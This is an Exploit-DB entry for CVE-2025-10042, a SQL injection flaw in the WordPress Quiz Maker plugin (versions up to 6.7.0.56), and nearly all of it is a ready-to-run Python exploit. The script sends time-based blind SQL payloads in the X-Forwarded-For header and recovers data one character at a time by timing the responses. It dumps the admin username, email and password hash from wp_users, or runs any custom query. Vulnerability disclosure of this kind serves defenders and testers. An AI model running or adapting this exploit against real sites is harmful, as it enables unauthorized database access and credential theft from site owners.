---
title: [webapps] WordPress Quiz Maker 6.7.0.56 - SQL Injection
url: https://www.exploit-db.com/exploits/52465
source: Exploit-DB.com RSS Feed
date: 2025-12-25
fetch_date: 2025-12-26T03:22:51.465399
---

# [webapps] WordPress Quiz Maker 6.7.0.56 - SQL Injection

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# WordPress Quiz Maker 6.7.0.56 - SQL Injection

#### EDB-ID:

###### 52465

#### CVE:

###### [2025-10042](https://nvd.nist.gov/vuln/detail/CVE-2025-10042)

---

**EDB Verified:**

#### Author:

###### [Rahul Sreenivasan](/?author=12323)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-12-25

---

**Vulnerable App:**

```
# Exploit Title: WordPress Quiz Maker 6.7.0.56 - SQL Injection
# Date: 2025-12-16
# Exploit Author: Rahul Sreenivasan (Tr0j4n)
# Vendor Homepage: https://ays-pro.com/wordpress/quiz-maker
# Software Link: https://wordpress.org/plugins/quiz-maker/
# Version: <= 6.7.0.56
# Tested on: WordPress 6.x with Quiz Maker 6.7.0.56 on Ubuntu/Nginx/PHP-FPM
# CVE: CVE-2025-10042

from argparse import ArgumentParser
from requests import get
from requests.packages.urllib3 import disable_warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from time import time
from sys import exit

disable_warnings(InsecureRequestWarning)

CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-@.!$/:?"

def send_payload(url, path, header, payload, timeout):
    target = f"{url.rstrip('/')}/{path.lstrip('/')}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        header: payload
    }
    try:
        start = time()
        get(target, headers=headers, timeout=timeout, verify=False)
        return time() - start
    except:
        return timeout

def check_vulnerable(url, path, header, sleep_time, timeout):
    print("[*] Testing for SQL injection vulnerability...")

    baseline = send_payload(url, path, header, "127.0.0.1", timeout)
    print(f"[*] Baseline response time: {baseline:.2f}s")

    payload = f"1' OR SLEEP({sleep_time})#"
    injection = send_payload(url, path, header, payload, timeout)
    print(f"[*] Injection response time: {injection:.2f}s")

    if injection >= sleep_time * 0.7:
        print("[+] Target is VULNERABLE!")
        return True
    else:
        print("[-] Target does not appear to be vulnerable.")
        return False

def extract_length(url, path, header, query, timeout):
    low, high = 1, 100

    while low < high:
        mid = (low + high) // 2
        payload = f"1' OR IF(LENGTH(({query}))>{mid},SLEEP(1),0)#"
        elapsed = send_payload(url, path, header, payload, timeout)

        if elapsed >= 0.8:
            low = mid + 1
        else:
            high = mid

    return low

def extract_char(url, path, header, query, position, timeout):
    low, high = 32, 126

    while low < high:
        mid = (low + high) // 2
        payload = f"1' OR IF(ASCII(SUBSTRING(({query}),{position},1))>{mid},SLEEP(1),0)#"
        elapsed = send_payload(url, path, header, payload, timeout)

        if elapsed >= 0.8:
            low = mid + 1
        else:
            high = mid

    return chr(low) if low <= 126 else "?"

def extract_data(url, path, header, query, timeout):
    length = extract_length(url, path, header, query, timeout)
    print(f"[*] Data length: {length}")

    result = ""
    for i in range(1, length + 1):
        char = extract_char(url, path, header, query, i, timeout)
        result += char
        print(f"\r[*] Extracting: {result}", end="", flush=True)

    print()
    return result

def dump_users(url, path, header, timeout):
    print("\n[*] Extracting WordPress admin users...")

    # Get admin user login
    query = "SELECT user_login FROM wp_users WHERE ID=1"
    username = extract_data(url, path, header, query, timeout)
    print(f"[+] Username: {username}")

    # Get admin email
    query = "SELECT user_email FROM wp_users WHERE ID=1"
    email = extract_data(url, path, header, query, timeout)
    print(f"[+] Email: {email}")

    # Get password hash
    query = "SELECT user_pass FROM wp_users WHERE ID=1"
    password = extract_data(url, path, header, query, timeout)
    print(f"[+] Password Hash: {password}")

    return username, email, password

def main():
    parser = ArgumentParser(description="WordPress Quiz Maker SQLi Exploit (CVE-2025-10042)")
    parser.add_argument("-u", "--url", required=True, help="Target WordPress URL")
    parser.add_argument("-p", "--path", required=True, help="Path to quiz page")
    parser.add_argument("-H", "--header", default="X-Forwarded-For", help="Header for injection")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--check", action="store_true", help="Only check vulnerability")
    parser.add_argument("--dump", action="store_true", help="Dump admin credentials")
    parser.add_argument("--query", help="Custom SQL query to extract")
    args = parser.parse_args()

    print("[+] WordPress Quiz Maker SQLi Exploit (CVE-2025-10042)")
    print(f"[+] Target: {args.url}")

    if not check_vulnerable(args.url, args.path, args.header, 3, args.timeout):
        exit(1)

    if args.check:
        exit(0)

    if args.dump:
        dump_users(args.url, args.path, args.header, args.timeout)
    elif args.query:
        print(f"\n[*] Executing custom query: {args.query}")
        result = extract_data(args.url, args.path, args.header, args.query, args.timeout)
        print(f"[+] Result: {result}")
    else:
        dump_users(args.url, args.path, args.header, args.timeout)

if __name__ == "__main__":
    main()
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Penetration Testing Services](https://ww...